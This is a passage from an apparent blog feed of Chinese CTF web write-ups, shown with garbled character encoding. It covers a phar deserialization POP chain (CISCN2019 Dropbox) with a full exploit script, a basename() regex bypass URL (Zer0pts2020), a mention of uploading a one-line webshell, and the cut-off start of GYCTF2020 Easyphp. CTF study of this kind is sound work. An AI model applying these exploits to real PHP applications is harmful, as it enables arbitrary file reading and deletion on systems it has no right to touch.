array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼š</p><p>index.phpä¸­ï¼Œ$aæ˜¯ä¸€ä¸ªFileListå¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨äº†Name()ï¼ŒSize()æ–¹æ³•ï¼Œç„¶è€Œclass.phpä¸­çš„FileListç±»å¹¶æ²¡æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•ï¼ŒåŒæ—¶åˆæœ‰__call()æ–¹æ³•ï¼Œè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–çš„åˆ©ç”¨ç‚¹</p><p>è·Ÿè¿›__call()æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$funcçš„å€¼ä¸ºè°ƒç”¨çš„â€ä¸å­˜åœ¨çš„æ–¹æ³•â€œï¼Œè¯¥__call()æ–¹æ³•åŠŸèƒ½å°±æ˜¯å¯¹æ¯ä¸ªæ–‡ä»¶éƒ½è°ƒç”¨$funcæ‰€ä»£è¡¨çš„æ–¹æ³•ï¼Œåœ¨è¯¥ç±»çš„æ„é€ å‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°$this-&gt;filesä¸­çš„å…ƒç´ éƒ½æ˜¯Fileç±»çš„å¯¹è±¡ï¼Œè¿›å…¥Fileç±»</p><p>Fileç±»ä¸­æœ‰close()æ–¹æ³•ï¼Œè·Ÿè¿›å®ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>file_get_contents()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¯»å–$this-&gt;filenameæ‰€ä»£è¡¨æ–‡ä»¶çš„æ‰€æœ‰å†…å®¹ï¼Œå¯ä»¥ç”¨æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p>popé“¾å¤§è‡´å·²ç»å‡ºæ¥äº†ï¼Œè®©ä¸€ä¸ªFileListå¯¹è±¡è°ƒç”¨closeæ–¹æ³•ï¼Œæ¥è§¦å‘__callæ–¹æ³•ï¼Œä»è€Œè§¦å‘Fileå¯¹è±¡çš„closeæ–¹æ³•è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œç°åœ¨è¿˜è¦è§£å†³çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚ä½•è®©ä¸€ä¸ªFileListå¯¹è±¡å»è°ƒç”¨closeæ–¹æ³•ï¼Œå…¨å±€æœç´¢closeï¼Œå¯ä»¥åœ¨Userç±»ä¸­æ‰¾åˆ°å®ƒçš„ææ„å‡½æ•°ï¼Œè·Ÿè¿›ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;dbå¯æ§ï¼Œè¿™é‡Œå°±æ˜¯ååºåˆ—åŒ–çš„èµ·ç‚¹</p><p>ä¸‹é¢æ„é€ expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files   = [<span class="keyword">new</span> File(<span class="string">&quot;/flag.txt&quot;</span>)];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs   = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬ç”Ÿæˆpharæ–‡ä»¶ï¼Œæ”¹åç¼€ä¸Šä¼ </p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124145611612.png" alt="image-20220124145611612"></p><p>è¿™é‡Œè¿˜æœ‰æœ€åä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„download.phpä¼šæŠŠå«æœ‰å­—ç¬¦ä¸²<code>flag</code>çš„æ–‡ä»¶éƒ½è¿‡æ»¤æ‰ï¼Œç”¨ä¸‹è½½æ–¹æ³•çš„è¯æ˜¯çœ‹ä¸åˆ°flagæ–‡ä»¶çš„ï¼Œæ•´ä¸ªé¡µé¢è¿˜å‰©ä¸‹æœ€åä¸€ä¸ªåˆ é™¤åŠŸèƒ½æ²¡æœ‰ä½¿ç”¨ï¼Œå…ˆæŸ¥çœ‹delete.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œdownload.phpä¸€å¯¹æ¯”å°±å‘ç°delete.phpä¸­å°‘äº†å¯¹<code>flag</code>çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬è¦ç”¨åˆ é™¤æ¥æŸ¥çœ‹flagï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åï¼Œå‘é€æŠ¥æ–‡å³å¯å¾—åˆ°flag</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124152700472.png" alt="image-20220124152700472"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ³¨å†Œè´¦å·ï¼Œç™»å½•ï¼Œè¿›å…¥ä¸€ä¸ªç½‘ç›˜ç®¡ç†é¡µé¢ï¼Œå…è®¸è¿›è¡Œ&lt;code&gt;jpg/png/gif&lt;/code&gt;æ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ç„¶åæŠ“åŒ…ï¼Œç»•è¿‡&lt;code&gt;Content-Type&lt;/code&gt;éªŒè¯ï¼Œå³å¯åœ¨åˆ—è¡¨ä¸­çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/01</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¸¤é“ä»£ç å®¡è®¡</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/19/%E4%B8%A4%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/19/%E4%B8%A4%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-01-19T01:16:03.000Z</published>
    <updated>2022-01-20T08:12:43.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Zer0pts2020-canyouguessit"><a href="#Zer0pts2020-canyouguessit" class="headerlink" title="[Zer0pts2020]canyouguessit"></a>[Zer0pts2020]canyouguessit</h1><p>é¢˜ç›®æä¾›æºç æŸ¥è¯¢é”®ï¼Œè·³è½¬åˆ°æºç ç•Œé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡å¾—åˆ°ä¿¡æ¯ï¼š</p><p>$secretæ˜¯ä¸€ä¸²éšæœºçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¦‚æœ$secretå’Œ$guessç›¸ç­‰å°±è¾“å‡ºflagï¼Œä½†æ˜¯$secreté•¿åº¦ä¸º64ä½ï¼Œåº”è¯¥æ˜¯æ— æ³•çˆ†ç ´ï¼Œå¹¶ä¸”$guesså’Œ$secretæ¯”è¾ƒæ—¶ä¹Ÿç”¨çš„æ˜¯å®‰å…¨çš„<a href="https://www.php.net/manual/zh/function.hash-equals.php">hash_equals()</a>ï¼Œåº”è¯¥ä¹Ÿç»•è¿‡ä¸äº†</p><p>ç°åœ¨æ¥çœ‹<a href="https://www.php.net/manual/zh/function.hash-equals.php">basename()</a>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œè€ŒPHP_SELFæ˜¯æŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œçš„æ–‡ä»¶å</p><p>å› æ­¤<code>/index.php?source</code>å°±ä¼šç›´æ¥è¿”å›index.phpçš„æºç </p><p>é‚£ä¹ˆå°†è·¯å¾„æ”¹ä¸º<code>/index.php/config.php?source</code>å°±èƒ½è¿”å›flagï¼Œæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯è¦ç»•è¿‡æ­£åˆ™</p><p>basename()æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå®ƒä¼šå»é™¤æ–‡ä»¶å¼€å¤´çš„éasciiå­—ç¬¦ï¼Œæ•…æ„é€ <code>/index.php/config.php/%ff?source</code>ï¼Œé¡µé¢å°±ä¼šå›æ˜¾flag</p><h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>è¿›æ¥æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéšä¾¿è¾“ä¸ªè´¦æˆ·å¯†ç ç™»å½•ï¼Œå›æ˜¾æ— è¯¥ç”¨æˆ·ï¼Œä¹Ÿæ²¡ä¸ªæ³¨å†Œé¡µé¢ï¼Œé¢˜ç›®å«ezphpï¼Œé‚£æ„Ÿè§‰ä¹Ÿä¸æ˜¯æ³¨å…¥ï¼Œå…ˆæ‰«ä¸€éç›®å½•ï¼Œ<code>www.zip</code>æºç æ³„éœ²ï¼Œè§£å‹å¾—4ä¸ªphpæ–‡ä»¶ï¼Œå®¡è®¡ä¸€ä¸‹</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>getä¼ å‚actionç”¨æ¥è·³è½¬åˆ°å…¶å®ƒæ–‡ä»¶ï¼Œè‹¥session[â€˜loginâ€™]==1è·³è½¬åˆ°update.php</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span 